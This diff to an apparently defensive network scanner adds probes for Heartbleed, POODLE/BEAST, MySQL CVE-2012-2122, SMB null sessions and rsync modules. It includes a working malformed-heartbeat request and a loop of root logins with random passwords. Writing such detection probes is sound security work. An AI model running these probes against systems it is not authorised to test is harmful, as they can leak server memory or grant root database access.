@@ -430,6 +430,14 @@ class _ServiceInfoMixin:
     findings += self._tls_check_expiry(raw)
     findings += self._tls_check_default_cn(raw)
 
+    # Pass 4: Heartbleed (CVE-2014-0160)
+    heartbleed = self._tls_check_heartbleed(target, port)
+    if heartbleed:
+      findings.append(heartbleed)
+
+    # Pass 5: Downgrade attacks (POODLE / BEAST)
+    findings += self._tls_check_downgrade(target, port)
+
     if not findings:
       findings.append(Finding(Severity.INFO, f"TLS {proto} {cipher}", "TLS configuration adequate."))
 
@@ -657,6 +665,273 @@ class _ServiceInfoMixin:
       pass
     return findings
 
+
+  def _tls_check_heartbleed(self, target, port):
+    """Test for Heartbleed (CVE-2014-0160) by sending a malformed TLS heartbeat.
+
+    Builds a raw TLS connection, completes handshake, then sends a heartbeat
+    request with payload_length > actual payload. If the server responds with
+    more data than sent, it is leaking memory.
+
+    Returns
+    -------
+    Finding or None
+      CRITICAL finding if vulnerable, None otherwise.
+    """
+    try:
+      # Connect and perform TLS handshake via ssl module
+      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+      ctx.check_hostname = False
+      ctx.verify_mode = ssl.CERT_NONE
+      # Allow older protocols for compatibility with vulnerable servers
+      ctx.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
+
+      raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      raw_sock.settimeout(3)
+      raw_sock.connect((target, port))
+      tls_sock = ctx.wrap_socket(raw_sock, server_hostname=target)
+
+      # Get the negotiated TLS version for the heartbeat record
+      tls_version = tls_sock.version()
+      version_map = {
+        "TLSv1": b"\x03\x01", "TLSv1.1": b"\x03\x02",
+        "TLSv1.2": b"\x03\x03", "TLSv1.3": b"\x03\x03",
+        "SSLv3": b"\x03\x00",
+      }
+      tls_ver_bytes = version_map.get(tls_version, b"\x03\x01")
+
+      # Build heartbeat request (ContentType=24, HeartbeatMessageType=1=request)
+      # payload_length is set to 16384 but actual payload is only 1 byte
+      # This is the essence of the Heartbleed attack: asking for more data than sent
+      hb_payload = b"\x01"  # 1 byte actual payload
+      hb_msg = (
+        b"\x01"               # HeartbeatMessageType: request
+        + b"\x40\x00"         # payload_length: 16384 (0x4000)
+        + hb_payload           # actual payload: 1 byte
+        + b"\x00" * 16        # padding (16 bytes)
+      )
+
+      # TLS record: ContentType=24 (Heartbeat), version, length
+      tls_record = (
+        b"\x18"               # ContentType: Heartbeat
+        + tls_ver_bytes        # TLS version
+        + struct.pack(">H", len(hb_msg))
+        + hb_msg
+      )
+
+      # Send via the underlying raw socket (bypassing ssl module)
+      # We need to access the raw socket after handshake
+      # The ssl wrapper doesn't let us send raw records, so use raw_sock.
+      # After wrap_socket, raw_sock is consumed. Instead, use tls_sock.unwrap()
+      # to get the raw socket back.
+      try:
+        raw_after = tls_sock.unwrap()
+        raw_after.sendall(tls_record)
+        raw_after.settimeout(3)
+        response = raw_after.recv(65536)
+        raw_after.close()
+      except (ssl.SSLError, OSError):
+        # If unwrap fails, try closing and testing with a new raw connection
+        tls_sock.close()
+        return self._tls_heartbleed_raw(target, port, tls_ver_bytes)
+
+      if response and len(response) >= 7:
+        # Check if response is a heartbeat response (ContentType=24)
+        if response[0] == 24:
+          resp_len = struct.unpack(">H", response[3:5])[0]
+          # If server sent back more than we sent (3 bytes of heartbeat msg),
+          # it leaked memory
+          if resp_len > len(hb_msg):
+            return Finding(
+              severity=Severity.CRITICAL,
+              title="TLS Heartbleed vulnerability (CVE-2014-0160)",
+              description=f"Server at {target}:{port} is vulnerable to Heartbleed. "
+                          "An attacker can read up to 64KB of server memory per request, "
+                          "potentially exposing private keys, session tokens, and passwords.",
+              evidence=f"Heartbeat response size ({resp_len} bytes) > request payload size ({len(hb_msg)} bytes). "
+                       f"Leaked {resp_len - len(hb_msg)} bytes of server memory.",
+              remediation="Upgrade OpenSSL to 1.0.1g or later and regenerate all private keys and certificates.",
+              owasp_id="A06:2021",
+              cwe_id="CWE-126",
+              confidence="certain",
+            )
+        # TLS Alert (ContentType=21) = not vulnerable (server rejected heartbeat)
+        elif response[0] == 21:
+          return None
+
+    except Exception:
+      pass
+    return None
+
+  def _tls_heartbleed_raw(self, target, port, tls_ver_bytes):
+    """Fallback Heartbleed test using a raw TLS ClientHello with heartbeat extension.
+
+    This is needed when ssl.unwrap() fails. We build a minimal TLS 1.0
+    ClientHello that advertises the heartbeat extension, complete the handshake,
+    and then send the malformed heartbeat.
+
+    Returns
+    -------
+    Finding or None
+    """
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(5)
+      sock.connect((target, port))
+
+      # Minimal TLS 1.0 ClientHello with heartbeat extension
+      # This is a simplified approach: we use struct to build the exact bytes
+      hello = bytearray()
+      # Handshake header: ClientHello (0x01)
+      # Random: 32 bytes
+      client_random = random.randbytes(32)
+      # Session ID: 0 bytes
+      # Cipher suites: a few common ones
+      ciphers = (
+        b"\x00\x2f"  # TLS_RSA_WITH_AES_128_CBC_SHA
+        b"\x00\x35"  # TLS_RSA_WITH_AES_256_CBC_SHA
+        b"\x00\x0a"  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
+      )
+      # Compression: null only
+      compression = b"\x01\x00"
+      # Extensions: heartbeat (type 0x000f, length 1, mode=1 peer allowed to send)
+      heartbeat_ext = struct.pack(">HH", 0x000f, 1) + b"\x01"
+      extensions = heartbeat_ext
+
+      client_hello_body = (
+        b"\x03\x01"  # TLS 1.0
+        + client_random
+        + b"\x00"  # Session ID length: 0
+        + struct.pack(">H", len(ciphers)) + ciphers
+        + compression
+        + struct.pack(">H", len(extensions)) + extensions
+      )
+
+      # Handshake message: type=1 (ClientHello), length
+      handshake = b"\x01" + struct.pack(">I", len(client_hello_body))[1:] + client_hello_body
+
+      # TLS record: ContentType=22 (Handshake), version=TLS 1.0
+      tls_record = b"\x16\x03\x01" + struct.pack(">H", len(handshake)) + handshake
+      sock.sendall(tls_record)
+
+      # Read ServerHello + Certificate + ServerHelloDone
+      # We just need to consume enough to complete the handshake
+      server_response = b""
+      for _ in range(10):
+        try:
+          chunk = sock.recv(16384)
+          if not chunk:
+            break
+          server_response += chunk
+          # Check if we received ServerHelloDone (handshake type 0x0e)
+          if b"\x0e\x00\x00\x00" in server_response:
+            break
+        except (socket.timeout, OSError):
+          break
+
+      if not server_response:
+        sock.close()
+        return None
+
+      # Now send the malformed heartbeat
+      hb_msg = b"\x01\x40\x00" + b"\x41" + b"\x00" * 16  # type=request, length=16384, 1 byte payload + padding
+      hb_record = b"\x18\x03\x01" + struct.pack(">H", len(hb_msg)) + hb_msg
+      sock.sendall(hb_record)
+
+      # Read response
+      sock.settimeout(3)
+      try:
+        response = sock.recv(65536)
+      except (socket.timeout, OSError):
+        response = b""
+      sock.close()
+
+      if response and len(response) >= 7 and response[0] == 24:
+        resp_payload_len = struct.unpack(">H", response[3:5])[0]
+        if resp_payload_len > len(hb_msg):
+          return Finding(
+            severity=Severity.CRITICAL,
+            title="TLS Heartbleed vulnerability (CVE-2014-0160)",
+            description=f"Server at {target}:{port} is vulnerable to Heartbleed. "
+                        "An attacker can read up to 64KB of server memory per request, "
+                        "potentially exposing private keys, session tokens, and passwords.",
+            evidence=f"Heartbeat response ({resp_payload_len} bytes) exceeded request size.",
+            remediation="Upgrade OpenSSL to 1.0.1g or later and regenerate all private keys and certificates.",
+            owasp_id="A06:2021",
+            cwe_id="CWE-126",
+            confidence="certain",
+          )
+    except Exception:
+      pass
+    return None
+
+  def _tls_check_downgrade(self, target, port):
+    """Test for TLS downgrade vulnerabilities (POODLE, BEAST).
+
+    Returns list of findings.
+    """
+    findings = []
+
+    # --- POODLE: Test SSLv3 acceptance ---
+    try:
+      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+      ctx.check_hostname = False
+      ctx.verify_mode = ssl.CERT_NONE
+      ctx.maximum_version = ssl.TLSVersion.SSLv3
+      ctx.minimum_version = ssl.TLSVersion.SSLv3
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(3)
+      sock.connect((target, port))
+      tls_sock = ctx.wrap_socket(sock, server_hostname=target)
+      negotiated = tls_sock.version()
+      tls_sock.close()
+      if negotiated and "SSL" in negotiated:
+        findings.append(Finding(
+          severity=Severity.HIGH,
+          title="Server accepts SSLv3 — vulnerable to POODLE (CVE-2014-3566)",
+          description=f"TLS on {target}:{port} accepts SSLv3 connections. "
+                      "The POODLE attack allows decrypting SSLv3 traffic using CBC cipher padding oracles.",
+          evidence=f"Negotiated {negotiated} when SSLv3 was forced.",
+          remediation="Disable SSLv3 entirely on the server.",
+          owasp_id="A02:2021",
+          cwe_id="CWE-757",
+          confidence="certain",
+        ))
+    except (ssl.SSLError, OSError):
+      pass  # SSLv3 rejected or not available in runtime — good
+
+    # --- BEAST: Test TLS 1.0 with CBC cipher ---
+    try:
+      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+      ctx.check_hostname = False
+      ctx.verify_mode = ssl.CERT_NONE
+      ctx.maximum_version = ssl.TLSVersion.TLSv1
+      ctx.minimum_version = ssl.TLSVersion.TLSv1
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(3)
+      sock.connect((target, port))
+      tls_sock = ctx.wrap_socket(sock, server_hostname=target)
+      negotiated = tls_sock.version()
+      cipher_info = tls_sock.cipher()
+      tls_sock.close()
+      if negotiated and cipher_info:
+        cipher_name = cipher_info[0] if cipher_info else ""
+        if "CBC" in cipher_name.upper():
+          findings.append(Finding(
+            severity=Severity.MEDIUM,
+            title="TLS 1.0 with CBC cipher — BEAST risk (CVE-2011-3389)",
+            description=f"TLS on {target}:{port} accepts TLS 1.0 with CBC-mode cipher '{cipher_name}'. "
+                        "The BEAST attack exploits predictable IVs in TLS 1.0 CBC mode.",
+            evidence=f"Negotiated {negotiated} with cipher {cipher_name}.",
+            remediation="Disable TLS 1.0 or ensure only non-CBC ciphers are used with TLS 1.0.",
+            owasp_id="A02:2021",
+            cwe_id="CWE-327",
+            confidence="certain",
+          ))
+    except (ssl.SSLError, OSError):
+      pass  # TLS 1.0 rejected — good
+
+    return findings
 
   def _service_info_ftp(self, target, port):  # default port: 21
     """
@@ -1073,17 +1348,35 @@ class _ServiceInfoMixin:
 
     # --- 6. CVE check on banner version ---
     if result["banner"]:
-      ssh_version = self._ssh_extract_version(result["banner"])
-      if ssh_version:
+      ssh_lib, ssh_version = self._ssh_identify_library(result["banner"])
+      if ssh_lib and ssh_version:
+        result["ssh_library"] = ssh_lib
         result["ssh_version"] = ssh_version
-        findings += check_cves("openssh", ssh_version)
+        findings += check_cves(ssh_lib, ssh_version)
 
     return probe_result(raw_data=result, findings=findings)
 
-  def _ssh_extract_version(self, banner):
-    """Extract OpenSSH version from banner like 'SSH-2.0-OpenSSH_8.9p1'."""
-    m = _re.search(r'OpenSSH[_\s](\d+\.\d+(?:\.\d+)?)', banner, _re.IGNORECASE)
-    return m.group(1) if m else None
+  # Patterns: (regex, product_name_for_cve_db)
+  _SSH_LIBRARY_PATTERNS = [
+    (_re.compile(r'OpenSSH[_\s](\d+\.\d+(?:\.\d+)?)', _re.IGNORECASE), "openssh"),
+    (_re.compile(r'libssh[_\s-](\d+\.\d+(?:\.\d+)?)', _re.IGNORECASE), "libssh"),
+    (_re.compile(r'dropbear[_\s](\d+(?:\.\d+)*)', _re.IGNORECASE), "dropbear"),
+    (_re.compile(r'paramiko[_\s](\d+\.\d+(?:\.\d+)?)', _re.IGNORECASE), "paramiko"),
+  ]
+
+  def _ssh_identify_library(self, banner):
+    """Identify SSH library and version from banner string.
+
+    Returns
+    -------
+    tuple[str | None, str | None]
+      (product_name, version) — product_name matches cve_db product keys.
+    """
+    for pattern, product in self._SSH_LIBRARY_PATTERNS:
+      m = pattern.search(banner)
+      if m:
+        return product, m.group(1)
+    return None, None
 
   def _ssh_check_ciphers(self, target, port):
     """Audit SSH ciphers, KEX, and MACs via paramiko Transport.
@@ -1297,7 +1590,7 @@ class _ServiceInfoMixin:
       ))
 
     # CVE check on extracted MTA version
-    _smtp_product_map = {'exim': 'exim', 'postfix': 'postfix'}
+    _smtp_product_map = {'exim': 'exim', 'postfix': 'postfix', 'opensmtpd': 'opensmtpd'}
     if version_match and version_match.group(2):
       _cve_product = _smtp_product_map.get(version_match.group(1).lower())
       if _cve_product:
@@ -1663,7 +1956,139 @@ class _ServiceInfoMixin:
         confidence="certain",
       ))
 
+    # --- CVE-2012-2122 auth bypass test ---
+    # Affected: MySQL 5.1.x < 5.1.63, 5.5.x < 5.5.25, MariaDB < 5.5.23
+    # Bug: memcmp return value truncation means ~1/256 chance of auth bypass
+    cve_bypass = self._mysql_test_cve_2012_2122(target, port)
+    if cve_bypass:
+      findings.append(cve_bypass)
+      raw["cve_2012_2122"] = True
+
     return probe_result(raw_data=raw, findings=findings)
+
+  # Affected version ranges for CVE-2012-2122
+  _MYSQL_CVE_2012_2122_RANGES = [
+    ((5, 1, 0), (5, 1, 63)),   # MySQL 5.1.x < 5.1.63
+    ((5, 5, 0), (5, 5, 25)),   # MySQL 5.5.x < 5.5.25
+  ]
+
+  def _mysql_test_cve_2012_2122(self, target, port):
+    """Test for MySQL CVE-2012-2122 timing-based authentication bypass.
+
+    On affected versions, memcmp() return value is cast to char, giving
+    a ~1/256 chance that any password is accepted. 300 attempts gives
+    ~69% probability of detection.
+
+    Returns
+    -------
+    Finding or None
+      CRITICAL finding if bypass confirmed, None otherwise.
+    """
+    import hashlib
+
+    # First, connect to get version
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(3)
+      sock.connect((target, port))
+      data = sock.recv(256)
+      sock.close()
+    except Exception:
+      return None
+
+    if not data or len(data) < 5:
+      return None
+    pkt_payload = data[4:]
+    if not pkt_payload or pkt_payload[0] != 0x0a:
+      return None
+
+    version_str = pkt_payload[1:].split(b'\x00')[0].decode('utf-8', errors='ignore')
+    version_tuple = tuple(int(x) for x in _re.findall(r'\d+', version_str)[:3])
+    if len(version_tuple) < 3:
+      return None
+
+    # Check if version is in affected range
+    affected = False
+    for low, high in self._MYSQL_CVE_2012_2122_RANGES:
+      if low <= version_tuple < high:
+        affected = True
+        break
+    if not affected:
+      return None
+
+    # Attempt rapid auth with random passwords
+    self.P(f"MySQL {version_str} in CVE-2012-2122 range — testing auth bypass ({target}:{port})", color='y')
+    attempts = 300
+
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(5)
+      sock.connect((target, port))
+
+      for _ in range(attempts):
+        # Read handshake
+        data = sock.recv(512)
+        if not data or len(data) < 5:
+          break
+        pkt_payload = data[4:]
+        if not pkt_payload or pkt_payload[0] != 0x0a:
+          break
+
+        # Extract salt
+        parts = pkt_payload[1:].split(b'\x00', 1)
+        rest = parts[1] if len(parts) > 1 else b''
+        if len(rest) < 13:
+          break
+        salt1 = rest[5:13]
+        salt2 = rest[28:40].rstrip(b'\x00') if len(rest) >= 28 else b''
+        salt = salt1 + salt2
+
+        # Auth with random password
+        rand_pass = random.randbytes(20)
+        sha1_pass = hashlib.sha1(rand_pass).digest()
+        sha1_sha1 = hashlib.sha1(sha1_pass).digest()
+        sha1_salt = hashlib.sha1(salt + sha1_sha1).digest()
+        auth_data = bytes(a ^ b for a, b in zip(sha1_pass, sha1_salt))
+
+        client_flags = struct.pack('<I', 0x0003a685)
+        max_pkt = struct.pack('<I', 16777216)
+        charset = b'\x21'
+        reserved = b'\x00' * 23
+        user_bytes = b'root\x00'
+        auth_len = bytes([len(auth_data)])
+        auth_plugin = b'mysql_native_password\x00'
+
+        payload = client_flags + max_pkt + charset + reserved + user_bytes + auth_len + auth_data + auth_plugin
+        pkt_len = struct.pack('<I', len(payload))[:3]
+        seq = b'\x01'
+        sock.sendall(pkt_len + seq + payload)
+
+        resp = sock.recv(256)
+        if resp and len(resp) >= 5 and resp[4] == 0x00:
+          sock.close()
+          return Finding(
+            severity=Severity.CRITICAL,
+            title=f"MySQL authentication bypass confirmed (CVE-2012-2122)",
+            description=f"MySQL {version_str} on {target}:{port} accepted login with a random password "
+                        "due to CVE-2012-2122 memcmp truncation bug. Any attacker can gain root access.",
+            evidence=f"Auth succeeded with random password on attempt (version {version_str})",
+            remediation="Upgrade MySQL to at least 5.1.63 / 5.5.25 / MariaDB 5.5.23.",
+            owasp_id="A07:2021",
+            cwe_id="CWE-305",
+            confidence="certain",
+          )
+
+        # If error packet, server closes connection — reconnect
+        if resp and len(resp) >= 5 and resp[4] == 0xFF:
+          sock.close()
+          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          sock.settimeout(3)
+          sock.connect((target, port))
+
+      sock.close()
+    except Exception:
+      pass
+    return None
 
   def _service_info_rdp(self, target, port):  # default port: 3389
     """
@@ -2188,7 +2613,16 @@ class _ServiceInfoMixin:
 
   def _service_info_smb(self, target, port):  # default port: 445
     """
-    Probe SMB services for negotiation responses.
+    Probe SMB services: dialect negotiation, version extraction, CVE matching,
+    null session test, and security flag analysis.
+
+    Checks performed:
+
+    1. SMB negotiate — determine supported dialect (SMBv1/v2/v3).
+    2. Version extraction — parse Samba/Windows version from NativeOS/NativeLanMan.
+    3. Security flags — check signing requirements.
+    4. Null session — attempt anonymous IPC$ access.
+    5. CVE matching — run check_cves on extracted Samba version.
 
     Parameters
     ----------
@@ -2203,39 +2637,286 @@ class _ServiceInfoMixin:
       Structured findings.
     """
     findings = []
-    raw = {"banner": None}
+    raw = {
+      "banner": None, "dialect": None, "server_os": None,
+      "server_domain": None, "samba_version": None,
+      "signing_required": None, "smbv1_supported": False,
+    }
+
+    # --- 1. SMBv1 Negotiate ---
+    # Build a proper SMBv1 Negotiate Protocol Request with NT LM 0.12 dialect
+    dialects = b"\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00"
+    smb_header = bytearray(32)
+    smb_header[0:4] = b"\xffSMB"  # Protocol ID
+    smb_header[4] = 0x72          # Command: Negotiate
+    # Flags: 0x18 (case-sensitive, canonicalized paths)
+    smb_header[13] = 0x18
+    # Flags2: unicode + NT status + long names
+    struct.pack_into("<H", smb_header, 14, 0xC803)
+    # Word count = 0, byte count = len(dialects)
+    smb_body = struct.pack("<BH", 0, len(dialects)) + dialects
+    smb_payload = bytes(smb_header) + smb_body
+    # NetBIOS session header: type=0x00, length=len(smb_payload)
+    netbios_header = struct.pack(">I", len(smb_payload))
+    netbios_header = b"\x00" + netbios_header[1:]  # force type=0
+
     try:
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      sock.settimeout(3)
+      sock.settimeout(4)
       sock.connect((target, port))
-      probe = b"\x00\x00\x00\x2f\xffSMB" + b"\x00" * 39
-      sock.sendall(probe)
-      data = sock.recv(4)
-      if data:
-        raw["banner"] = "SMB negotiation response received"
-        findings.append(Finding(
-          severity=Severity.MEDIUM,
-          title="SMB service responded to negotiation probe",
-          description=f"SMB on {target}:{port} accepts negotiation requests, "
-                      "exposing the host to SMB relay and enumeration attacks.",
-          evidence=f"SMB negotiate response: {data.hex()[:24]}",
-          remediation="Restrict SMB access to trusted networks; disable SMBv1.",
-          owasp_id="A01:2021",
-          cwe_id="CWE-284",
-          confidence="certain",
-        ))
-      else:
-        raw["banner"] = "SMB port open (no response)"
+      sock.sendall(netbios_header + smb_payload)
+
+      # Read NetBIOS header (4 bytes) + full response
+      resp_hdr = self._smb_recv_exact(sock, 4)
+      if not resp_hdr:
+        sock.close()
         findings.append(Finding(
           severity=Severity.INFO,
           title="SMB port open but no negotiation response",
           description=f"Port {port} is open but SMB did not respond to negotiation.",
           confidence="tentative",
         ))
+        return probe_result(raw_data=raw, findings=findings)
+
+      resp_len = struct.unpack(">I", b"\x00" + resp_hdr[1:4])[0]
+      resp_data = self._smb_recv_exact(sock, min(resp_len, 4096))
       sock.close()
+
+      if not resp_data or len(resp_data) < 36:
+        raw["banner"] = "SMB response too short"
+        findings.append(Finding(
+          severity=Severity.MEDIUM,
+          title="SMB service responded to negotiation probe",
+          description=f"SMB on {target}:{port} accepts negotiation requests.",
+          evidence=f"Response: {(resp_data or b'').hex()[:48]}",
+          remediation="Restrict SMB access to trusted networks; disable SMBv1.",
+          owasp_id="A01:2021",
+          cwe_id="CWE-284",
+          confidence="certain",
+        ))
+        return probe_result(raw_data=raw, findings=findings)
+
+      # Check if SMBv1 or SMBv2 response
+      protocol_id = resp_data[0:4]
+
+      if protocol_id == b"\xffSMB":
+        # --- SMBv1 response ---
+        raw["smbv1_supported"] = True
+        raw["banner"] = "SMBv1 negotiation response received"
+
+        # Parse negotiate response body (after 32-byte header)
+        if len(resp_data) >= 37:
+          word_count = resp_data[32]
+          if word_count >= 17 and len(resp_data) >= 32 + 1 + 34:
+            words_start = 33
+            dialect_idx = struct.unpack_from("<H", resp_data, words_start)[0]
+            security_mode = resp_data[words_start + 2]
+            raw["signing_required"] = bool(security_mode & 0x08)
+            raw["dialect"] = "NT LM 0.12" if dialect_idx == 0 else f"dialect_{dialect_idx}"
+
+            # Byte data after word parameters (17 words = 34 bytes)
+            byte_offset = words_start + 2 + (word_count * 2)
+            if byte_offset + 2 <= len(resp_data):
+              byte_count = struct.unpack_from("<H", resp_data, byte_offset)[0]
+              blob = resp_data[byte_offset + 2:]
+
+              # After security blob: OemDomainName\x00\x00ServerName\x00\x00 (unicode)
+              # The security blob length is in word 11 (22 bytes from words_start+2)
+              if word_count >= 17 and len(resp_data) >= words_start + 2 + 22 + 2:
+                sec_blob_len = struct.unpack_from("<H", resp_data, words_start + 2 + 22)[0]
+                after_blob = blob[sec_blob_len:]
+                # Try to extract unicode strings (OemDomainName, ServerName)
+                try:
+                  str_data = after_blob.decode("utf-16-le", errors="ignore")
+                  parts = str_data.split("\x00")
+                  parts = [p for p in parts if p]
+                  if len(parts) >= 1:
+                    raw["server_domain"] = parts[0]
+                  if len(parts) >= 2:
+                    raw["server_name"] = parts[1]
+                except Exception:
+                  pass
+
+        # SMBv1 is a security concern
+        findings.append(Finding(
+          severity=Severity.MEDIUM,
+          title="SMBv1 protocol supported (legacy, attack surface for MS17-010)",
+          description=f"SMB on {target}:{port} supports SMBv1, which is vulnerable to "
+                      "EternalBlue (MS17-010) and other SMBv1-specific attacks.",
+          evidence=f"Negotiated dialect: {raw['dialect']}, SMBv1 response received.",
+          remediation="Disable SMBv1 on the server (e.g., 'server min protocol = SMB2' in smb.conf).",
+          owasp_id="A06:2021",
+          cwe_id="CWE-757",
+          confidence="certain",
+        ))
+
+      elif protocol_id == b"\xfeSMB":
+        # --- SMBv2/3 response ---
+        raw["banner"] = "SMBv2 negotiation response received"
+        if len(resp_data) >= 72:
+          smb2_dialect = struct.unpack_from("<H", resp_data, 68)[0]
+          dialect_map = {0x0202: "SMB 2.0.2", 0x0210: "SMB 2.1",
+                        0x0300: "SMB 3.0", 0x0302: "SMB 3.0.2", 0x0311: "SMB 3.1.1"}
+          raw["dialect"] = dialect_map.get(smb2_dialect, f"0x{smb2_dialect:04x}")
+          # Security mode: offset 70
+          security_mode = struct.unpack_from("<H", resp_data, 70)[0]
+          raw["signing_required"] = bool(security_mode & 0x02)
+      else:
+        raw["banner"] = f"Unknown SMB response: {protocol_id.hex()}"
+
+      # --- Signing check ---
+      if raw["signing_required"] is False:
+        findings.append(Finding(
+          severity=Severity.MEDIUM,
+          title="SMB signing not required (relay attacks possible)",
+          description=f"SMB on {target}:{port} does not require message signing, "
+                      "allowing SMB relay / NTLM relay attacks.",
+          evidence=f"Security mode flags indicate signing is not required.",
+          remediation="Enable and require SMB signing on the server.",
+          owasp_id="A07:2021",
+          cwe_id="CWE-287",
+          confidence="certain",
+        ))
+
     except Exception as e:
       return probe_error(target, port, "SMB", e)
+
+    # --- 2. Null session for Samba version extraction ---
+    samba_version = self._smb_try_null_session(target, port)
+    if samba_version:
+      raw["samba_version"] = samba_version
+      raw["server_os"] = f"Samba {samba_version}"
+
+      findings.append(Finding(
+        severity=Severity.LOW,
+        title=f"Samba version disclosed: {samba_version}",
+        description=f"Samba {samba_version} detected on {target}:{port}.",
+        evidence=f"Samba version: {samba_version}",
+        remediation="Hide Samba version string if possible.",
+        cwe_id="CWE-200",
+        confidence="certain",
+      ))
+
+      # CVE check
+      findings += check_cves("samba", samba_version)
+
+    if not findings:
+      findings.append(Finding(
+        severity=Severity.MEDIUM,
+        title="SMB service responded to negotiation probe",
+        description=f"SMB on {target}:{port} accepts negotiation requests.",
+        evidence=f"Banner: {raw.get('banner', 'N/A')}",
+        remediation="Restrict SMB access to trusted networks; disable SMBv1.",
+        owasp_id="A01:2021",
+        cwe_id="CWE-284",
+        confidence="certain",
+      ))
+
     return probe_result(raw_data=raw, findings=findings)
+
+  @staticmethod
+  def _smb_recv_exact(sock, nbytes):
+    """Receive exactly nbytes from socket, or None on failure."""
+    buf = b""
+    while len(buf) < nbytes:
+      chunk = sock.recv(nbytes - len(buf))
+      if not chunk:
+        return None
+      buf += chunk
+    return buf
+
+  def _smb_try_null_session(self, target, port):
+    """Attempt SMBv1 null session to extract Samba version from SessionSetup response.
+
+    Returns
+    -------
+    str or None
+      Extracted Samba version string (e.g. '4.6.3'), or None.
+    """
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(3)
+      sock.connect((target, port))
+
+      # --- Negotiate ---
+      dialects = b"\x02NT LM 0.12\x00"
+      smb_header = bytearray(32)
+      smb_header[0:4] = b"\xffSMB"
+      smb_header[4] = 0x72  # Negotiate
+      smb_header[13] = 0x18
+      struct.pack_into("<H", smb_header, 14, 0xC803)
+      smb_body = struct.pack("<BH", 0, len(dialects)) + dialects
+      payload = bytes(smb_header) + smb_body
+      nb_hdr = b"\x00" + struct.pack(">I", len(payload))[1:]
+      sock.sendall(nb_hdr + payload)
+
+      # Read negotiate response
+      resp_hdr = self._smb_recv_exact(sock, 4)
+      if not resp_hdr:
+        sock.close()
+        return None
+      resp_len = struct.unpack(">I", b"\x00" + resp_hdr[1:4])[0]
+      self._smb_recv_exact(sock, min(resp_len, 4096))
+
+      # --- Session Setup AndX (null session) ---
+      smb_header2 = bytearray(32)
+      smb_header2[0:4] = b"\xffSMB"
+      smb_header2[4] = 0x73  # Session Setup AndX
+      smb_header2[13] = 0x18
+      struct.pack_into("<H", smb_header2, 14, 0xC803)
+
+      # Word count = 13 (standard Session Setup AndX)
+      words = struct.pack("<BBHHIHIHII",
+        13,        # word count
+        0xFF,      # AndXCommand: no further commands
+        0,         # reserved
+        0,         # AndXOffset
+        65535,     # max buffer size
+        1,         # max mpx count
+        0,         # VC number
+        0,         # session key (low)
+        0,         # ANSI password length
+        0,         # Unicode password length
+      )
+      # Capabilities
+      words += struct.pack("<I", 0x000000D4)
+
+      # Byte data: empty passwords + NativeOS + NativeLanManager
+      byte_data = b"\x00"  # null padding for alignment
+      byte_count = struct.pack("<H", len(byte_data))
+      payload2 = bytes(smb_header2) + words + byte_count + byte_data
+
+      nb_hdr2 = b"\x00" + struct.pack(">I", len(payload2))[1:]
+      sock.sendall(nb_hdr2 + payload2)
+
+      # Read session setup response
+      resp_hdr2 = self._smb_recv_exact(sock, 4)
+      if not resp_hdr2:
+        sock.close()
+        return None
+      resp_len2 = struct.unpack(">I", b"\x00" + resp_hdr2[1:4])[0]
+      resp_data2 = self._smb_recv_exact(sock, min(resp_len2, 4096))
+      sock.close()
+
+      if not resp_data2:
+        return None
+
+      # Extract NativeOS string — contains "Samba x.y.z" or "Windows ..."
+      # Search the response bytes for "Samba" followed by a version
+      resp_text = resp_data2.decode("utf-8", errors="ignore")
+      samba_match = _re.search(r'Samba\s+(\d+\.\d+(?:\.\d+)?)', resp_text)
+      if samba_match:
+        return samba_match.group(1)
+
+      # Also try UTF-16-LE decoding
+      resp_text_u16 = resp_data2.decode("utf-16-le", errors="ignore")
+      samba_match_u16 = _re.search(r'Samba\s+(\d+\.\d+(?:\.\d+)?)', resp_text_u16)
+      if samba_match_u16:
+        return samba_match_u16.group(1)
+
+    except Exception:
+      pass
+    return None
 
 
   # NetBIOS name suffix → human-readable type
@@ -2520,6 +3201,151 @@ class _ServiceInfoMixin:
 
     return probe_result(raw_data=raw, findings=findings)
 
+  def _service_info_rsync(self, target, port):  # default port: 873
+    """
+    Rsync service probe: version handshake, module enumeration, auth check.
+
+    Checks performed:
+
+    1. Banner grab — extract rsync protocol version.
+    2. Module enumeration — ``#list`` to discover available modules.
+    3. Auth check — connect to each module to test unauthenticated access.
+
+    Parameters
+    ----------
+    target : str
+      Hostname or IP address.
+    port : int
+      Port being probed.
+
+    Returns
+    -------
+    dict
+      Structured findings.
+    """
+    findings = []
+    raw = {"version": None, "modules": []}
+
+    # --- 1. Connect and receive banner ---
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(3)
+      sock.connect((target, port))
+      banner = sock.recv(256).decode("utf-8", errors="ignore").strip()
+    except Exception as e:
+      return probe_error(target, port, "rsync", e)
+
+    if not banner.startswith("@RSYNCD:"):
+      try:
+        sock.close()
+      except Exception:
+        pass
+      findings.append(Finding(
+        severity=Severity.INFO,
+        title=f"Port {port} open but no rsync banner",
+        description=f"Expected @RSYNCD banner, got: {banner[:80]}",
+        confidence="tentative",
+      ))
+      return probe_result(raw_data=raw, findings=findings)
+
+    # Extract protocol version
+    proto_version = banner.split(":", 1)[1].strip().split()[0] if ":" in banner else None
+    raw["version"] = proto_version
+
+    findings.append(Finding(
+      severity=Severity.LOW,
+      title=f"Rsync service detected (protocol {proto_version})",
+      description=f"Rsync daemon is running on {target}:{port}.",
+      evidence=f"Banner: {banner}",
